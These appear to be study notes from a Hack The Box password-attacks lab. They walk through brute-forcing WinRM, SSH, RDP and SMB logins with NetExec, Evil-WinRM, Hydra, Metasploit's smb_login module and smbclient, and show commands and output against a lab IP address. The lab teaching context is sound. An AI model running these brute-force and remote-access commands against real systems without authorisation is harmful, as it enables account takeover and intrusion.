## WinRM

[Windows Remote Management](https://docs.microsoft.com/en-us/windows/win32/winrm/portal) (`WinRM`) is the Microsoft implementation of the [Web Services Management Protocol](https://docs.microsoft.com/en-us/windows/win32/winrm/ws-management-protocol) (`WS-Management`). It is a network protocol based on XML web services using the [Simple Object Access Protocol](https://docs.microsoft.com/en-us/windows/win32/winrm/windows-remote-management-glossary) (`SOAP`) used for remote management of Windows systems. 

By default, WinRM uses the TCP ports `5985` (`HTTP`) and `5986` (`HTTPS`).

A handy tool that we can use for our password attacks is [NetExec](https://github.com/Pennyw0rth/NetExec), which can also be used for other protocols such as SMB, LDAP, MSSQL, and others.

#### NetExec Menu Options

Running the tool with the `-h` flag will show us general usage instructions and some options available to us.
```
tylapcheong@htb[/htb]$ netexec -h
```

#### NetExec Protocol-Specific Help
```
tylapcheong@htb[/htb]$ netexec smb -h
```

#### NetExec Usage

The general format for using NetExec is as follows:
```
tylapcheong@htb[/htb]$ netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```

As an example, this is what attacking a WinRM endpoint might look like:
```
tylapcheong@htb[/htb]$ netexec winrm 10.129.42.197 -u user.list -p password.list

WINRM       10.129.42.197   5985   NONE             [*] None (name:10.129.42.197) (domain:None)
WINRM       10.129.42.197   5985   NONE             [*] http://10.129.42.197:5985/wsman
WINRM       10.129.42.197   5985   NONE             [+] None\user:password (Pwn3d!)
```

Another handy tool that we can use to communicate with the WinRM service is [Evil-WinRM](https://github.com/Hackplayers/evil-winrm), which allows us to communicate with the WinRM service efficiently.

#### Evil-WinRM

#### Installing Evil-WinRM
```
tylapcheong@htb[/htb]$ sudo gem install evil-winrm
```

#### Evil-WinRM Usage
```
tylapcheong@htb[/htb]$ evil-winrm -i <target-IP> -u <username> -p <password>
```

```
tylapcheong@htb[/htb]$ evil-winrm -i 10.129.42.197 -u user -p password

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\user\Documents>
```
If the login was successful, a terminal session is initialized using the [Powershell Remoting Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-psrp/602ee78e-9a19-45ad-90fa-bb132b7cecec) (`MS-PSRP`), which simplifies the operation and execution of commands.

#### Hydra - SSH

We can use a tool like `Hydra` to brute force SSH. This is covered in-depth in the [Login Brute Forcing](https://academy.hackthebox.com/course/preview/login-brute-forcing) module.

`tylapcheong@htb[/htb]$ hydra -L user.list -P password.list ssh://10.129.42.197`

To log in to the system via the SSH protocol, we can use the OpenSSH client, which is available by default on most Linux distributions.

`tylapcheong@htb[/htb]$ ssh user@10.129.42.197`

## Remote Desktop Protocol (RDP)

Microsoft's [Remote Desktop Protocol](https://docs.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol) (`RDP`) is a network protocol that allows remote access to Windows systems via `TCP port 3389` by default.

#### Hydra - RDP

We can also use `Hydra` to perform RDP bruteforcing.
`tylapcheong@htb[/htb]$ hydra -L user.list -P password.list rdp://10.129.42.197`

#### xFreeRDP
`xfreerdp /v:<target-IP> /u:<username> /p:<password>`
`tylapcheong@htb[/htb]$ xfreerdp /v:10.129.42.197 /u:user /p:password`

## SMB

[Server Message Block](https://docs.microsoft.com/en-us/windows/win32/fileio/microsoft-smb-protocol-and-cifs-protocol-overview) (`SMB`) is a protocol responsible for transferring data between a client and a server in local area networks.

For SMB, we can also use `hydra` again to try different usernames in combination with different passwords.

#### Hydra - SMB
`tylapcheong@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197`

However, we may also get the following error describing that the server has sent an invalid reply.

#### Hydra - Error
```
tylapcheong@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-06 19:38:13
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 25 login tries (l:5236/p:4987234), ~25 tries per task
[DATA] attacking smb://10.129.42.197:445/
[ERROR] invalid reply from target smb://10.129.42.197:445/
```

#### Metasploit Framework
```
tylapcheong@htb[/htb]$ msfconsole -q

msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > options 
msf6 auxiliary(scanner/smb/smb_login) > set user_file user.list
msf6 auxiliary(scanner/smb/smb_login) > set pass_file password.list
msf6 auxiliary(scanner/smb/smb_login) > set rhosts 10.129.42.197
msf6 auxiliary(scanner/smb/smb_login) > run
```

Now we can use `NetExec` again to view the available shares and what privileges we have for them.

#### NetExec
`tylapcheong@htb[/htb]$ netexec smb 10.129.42.197 -u "user" -p "password" --shares`

To communicate with the server via SMB, we can use, for example, the tool [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html). This tool will allow us to view the contents of the shares, upload, or download files if our privileges allow it.

#### Smbclient
`tylapcheong@htb[/htb]$ smbclient -U user \\\\10.129.42.197\\SHARENAME`